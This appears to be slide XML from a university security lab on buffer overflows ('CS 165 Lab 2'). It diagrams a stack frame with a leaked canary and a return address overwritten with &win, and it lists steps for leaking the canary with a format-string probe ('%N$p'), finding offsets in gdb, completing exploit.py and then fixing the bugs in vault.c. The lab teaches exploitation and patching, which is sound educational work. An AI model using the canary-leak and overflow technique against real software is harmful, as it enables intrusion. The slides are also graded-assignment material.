        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="2880360"/>
            <a:ext cx="2926080" cy="96012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filler</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="268" name="Google Shape;268;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="2880360"/>
            <a:ext cx="2560320" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D9D9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leaked canary</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2880360"/>
            <a:ext cx="1828800" cy="96012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rbp filler</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8321040" y="2880360"/>
            <a:ext cx="2103120" cy="960120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&amp;win</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="271" name="Google Shape;271;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="4005072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keeps the canary intact → check passes → ret jumps to win()</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="272" name="Google Shape;272;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4800600"/>
            <a:ext cx="1143000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check_request returns → canary matches → ret pops &amp;win → win() prints LAB2-WIN:vault-xxxxxxxx.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="273" name="Google Shape;273;p3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274" name="Google Shape;274;p30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Doing the Graded Lab</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;p31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="11247120" cy="45262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850" lIns="128000" spcFirstLastPara="1" rIns="7315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1  generate YOUR instance and build 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python3 make_vault.py &lt;your-student-id&gt;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make &amp;&amp; make test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2  find win()   (fixed address, because the build is -no-pie)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gdb ./vault        (gdb) print &amp;win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3  find the canary's leak slot  (value ends in 00 and changes each run)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echo '%N$p' | ./vault            # sweep N until you spot the canary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4  find the offsets in the live frame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(gdb) break check_request ; run &lt; tests/accept.bin ; x/16gx note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5  fill WIN, LEAK_INDEX, OFF_CANARY, OFF_RETADDR + build_payload() in exploit.py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python3 exploit.py               # -&gt; LAB2-WIN:vault-xxxxxxxx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6  fix BOTH bugs in vault.c; benign tests still pass; the exploit now fails</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="281" name="Google Shape;281;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="6144768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Submit: completed exploit.py, fixed vault.c, writeup.md.  The four values and the live canary are yours to find.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="282" name="Google Shape;282;p3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CS 165 · Lab 2 · Buffer Overflow</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p3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